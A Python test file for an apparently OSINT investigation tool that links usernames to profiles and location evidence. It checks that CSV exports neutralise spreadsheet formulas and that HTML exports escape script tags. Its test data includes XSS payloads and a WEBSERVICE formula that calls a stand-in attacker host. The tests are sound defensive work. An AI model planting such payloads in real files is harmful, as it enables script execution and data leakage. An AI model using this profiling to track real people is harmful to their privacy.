from datetime import UTC, datetime

from sqlalchemy import create_engine
from sqlalchemy.orm import Session

from app.models.db import Base, BrowserRun, Finding, Investigation, LocationObservation, ToolRun
from app.services.exports import csv_export, html_export, json_export


def populated() -> Investigation:
    item = Investigation(
        title="<script>alert(1)</script>",
        query="example",
        query_type="username",
        selected_tools=["maigret"],
        tags=[],
        proxy_name=None,
        created_at=datetime.now(UTC),
    )
    run = ToolRun(
        tool_id="maigret",
        display_name="Maigret",
        status="completed",
        timeout_seconds=60,
        duration_ms=123,
        tool_version="0.6.1",
        tool_commit="abc",
    )
    finding = Finding(
        query_type="username",
        queried_value="example",
        finding_type="profile",
        platform="GitHub",
        value="example",
        canonical_url="https://github.com/example",
        display_url="https://github.com/example",
        status="found",
        confidence=None,
        extra={
            "unsafe": "<img src=x onerror=alert(1)>",
            "profile": {
                "display_name": "Example Person",
                "avatar_url": "https://cdn.example/avatar.jpg",
                "location": "Dublin",
                "followers": 1234,
            },
            "image_cache": {
                "source_url": "https://cdn.example/avatar.jpg",
                "retrieved_at": "2026-07-20T10:00:00+00:00",
                "mime_type": "image/jpeg",
                "size_bytes": 2048,
                "sha256": "a" * 64,
            },
            "platform_details": [{"label": "Account ID", "value": "1234"}],
            "timeline_events": [
                {
                    "type": "registered",
                    "label": "Account registered",
                    "timestamp": "2012-03-04T05:06:07+00:00",
                    "source_field": "created_at",
                    "raw_value": "2012-03-04T05:06:07Z",
                    "semantic": "account_creation",
                    "confidence": "high",
                    "extractor": "GitHub API",
                }
            ],
        },
        source_tool="maigret",
        source_tools=["maigret"],
        observed_at=datetime.now(UTC),
    )
    location = LocationObservation(
        place_name="Dublin",
        locality="Dublin",
        country="Ireland",
        evidence_type="review",
        occurred_at=datetime(2025, 6, 1, tzinfo=UTC),
        published_at=datetime(2025, 6, 2, tzinfo=UTC),
        first_observed_at=datetime(2025, 6, 3, tzinfo=UTC),
        last_observed_at=datetime(2025, 6, 3, tzinfo=UTC),
        source_platform="Google Maps",
        source_url="https://google.com/maps/contrib/123",
        account_identifier="123",
        privacy_masked=False,
        confidence=0.65,
        raw_evidence={"review": "Public review"},
    )
    pivot_run = ToolRun(
        tool_id="sherlock",
        display_name="Sherlock",
        status="completed",
        timeout_seconds=180,
        query_value="pivot_handle",
        query_type="username",
        pivot_depth=1,
        pivot_source_finding_id="source-finding",
        pivot_automatic=True,
    )
    browser_run = BrowserRun(
        collector_id="generic_capture",
        session_name="sock-default",
        requested_url="https://google.com/maps/contrib/123",
        final_url="https://www.google.com/maps/contrib/123",
        status="completed",
        page_title="Example contributor",
        browser_version="149.0.7827.55",
        observed_at=datetime.now(UTC),
        screenshot_reference="case/browser/page.png",
        screenshot_sha256="b" * 64,
        html_reference="case/browser/page.html",
        html_sha256="c" * 64,
        manifest_reference="case/browser/manifest.json",
        manifest_sha256="d" * 64,
    )
    item.runs.extend([run, pivot_run])
    item.browser_runs.append(browser_run)
    item.findings.append(finding)
    item.location_observations.append(location)
    run.findings.append(finding)
    return item


def test_database_persistence() -> None:
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    with Session(engine) as db:
        db.add(populated())
        db.commit()
    with Session(engine) as db:
        loaded = db.query(Investigation).one()
        assert loaded.findings[0].source_tools == ["maigret"]


def test_csv_export_neutralises_spreadsheet_formulas() -> None:
    item = populated()
    item.findings[0].value = "=WEBSERVICE(\"https://attacker.invalid\")"
    item.findings[0].extra["profile"]["display_name"] = "+SUM(1,1)"
    item.findings[0].extra["profile"]["location"] = "@malicious"

    csv_data = csv_export(item).decode("utf-8-sig")

    assert "'=WEBSERVICE" in csv_data
    assert "'+SUM(1,1)" in csv_data
    assert "'@malicious" in csv_data


def test_complete_exports_and_xss_escaping() -> None:
    item = populated()
    item.notes = "Review this context before the detailed account evidence."
    json_data = json_export(item).decode()
    csv_data = csv_export(item).decode("utf-8-sig")
    html = html_export(item).decode()
    assert '"tool_commit"' not in json_data
    assert '"commit": "abc"' in json_data
    assert '"duration_ms": 123' in json_data
    assert '"query_value": "pivot_handle"' in json_data
    assert '"pivot_depth": 1' in json_data
    assert '"pivot_automatic": true' in json_data
    assert '"positive_findings": 1' in json_data
    assert '"browser_run_count": 1' in json_data
    assert '"browser_completed_count": 1' in json_data
    assert '"collector_id": "generic_capture"' in json_data
    assert '"manifest_sha256": "' + ("d" * 64) + '"' in json_data
    assert '"platform_count": 1' in json_data
    assert '"account_view"' in json_data
    assert '"unified_account_count": 1' in json_data
    assert '"timeline_event_count": 3' in json_data
    assert '"account_timeline_event_count": 1' in json_data
    assert '"display_name": "Example Person"' in json_data
    assert '"state": "cached"' in json_data
    assert '"classification": "single_observation"' in json_data
    assert '"evidence_type": "review"' in json_data
    assert '"source_platform": "Google Maps"' in json_data
    assert '"sha256": "' + ("a" * 64) + '"' in json_data
    assert "avatar_url" in csv_data and "Example Person" in csv_data
    assert "source_tools" in json_data and "GitHub" in csv_data
    assert "<script>alert(1)</script>" not in html
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in html
    assert "cached" in html and "image/jpeg" in html and "2048 bytes" in html
    assert "SHA-256 " + ("a" * 64) in html
    assert "Executive overview" in html
    assert "Investigator notes" in html
    assert "Review this context before the detailed account evidence." in html
    assert html.index("Investigator notes") < html.index("Unified account assessment")
    assert "Unified account assessment" in html
    assert "Account registered" in html
    assert "GitHub API" in html
    assert "Positive findings" in html
    assert "Location intelligence" in html
    assert "pivot_handle" in html and "automatic pivot" in html
    assert "Google Maps" in html and "Dublin" in html and "65%" in html
    assert "Managed browser evidence" in html
    assert "Example contributor" in html
    assert "Manifest " + ("d" * 64) in html
